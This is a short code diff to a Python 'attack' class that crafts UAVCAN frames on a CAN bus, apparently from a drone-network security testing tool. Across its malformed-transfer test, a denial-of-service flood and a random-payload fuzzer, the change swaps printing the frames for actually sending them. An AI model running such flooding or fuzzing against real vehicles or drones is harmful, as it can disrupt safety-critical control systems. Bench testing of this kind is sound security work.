@@ -137,8 +137,8 @@ class attack:
                 is_extended_id  = True,
                 data            = bytearray.fromhex( ' '.join(payload + [ UAVCAN_PAYLOAD(transfer_end = 0b0).get_tail() ] ) )
             )
-            print(msg)
-            # self.bus.send(msg)
+            # print(msg)
+            self.bus.send(msg)
             if counter != -1: counter -= 1
 
     def wrong_END_test(self):
@@ -164,8 +164,8 @@ class attack:
             is_extended_id  = True,
             data            = bytearray.fromhex( UAVCAN_PAYLOAD.random() + U_PAYLOAD.get_tail() )
         )
-        print(msg)
-        # self.bus.send(msg)
+        # print(msg)
+        self.bus.send(msg)
 
         U_PAYLOAD.transfer_start = 0b0
         while counter:
@@ -175,8 +175,8 @@ class attack:
                 is_extended_id  = True,
                 data            = bytearray.fromhex( UAVCAN_PAYLOAD.random() + U_PAYLOAD.get_tail() )
             )
-            print(msg)
-            # self.bus.send(msg)
+            # print(msg)
+            self.bus.send(msg)
             if counter != -1: counter -= 1
 
     def DoS(self, counter = -1):
@@ -195,8 +195,8 @@ class attack:
                     extended_id     = True, 
                     data            = b'\xc0'
                 )
-                print(msg)
-                # self.bus.send(msg)
+                # print(msg)
+                self.bus.send(msg)
                 if counter != -1: counter -= 1
 
     def Fuzz(self, counter = -1):
@@ -207,8 +207,8 @@ class attack:
                 data            = os.urandom(random.randint(0, 7)) + \
                                   bytearray.fromhex( UAVCAN_PAYLOAD(transfer_ID = random.randint(0, 2**5-1)).get_tail() )
             )
-            print(msg)
-            # self.bus.send(msg)
+            # print(msg)
+            self.bus.send(msg)
             if counter != -1: counter -= 1
 
 
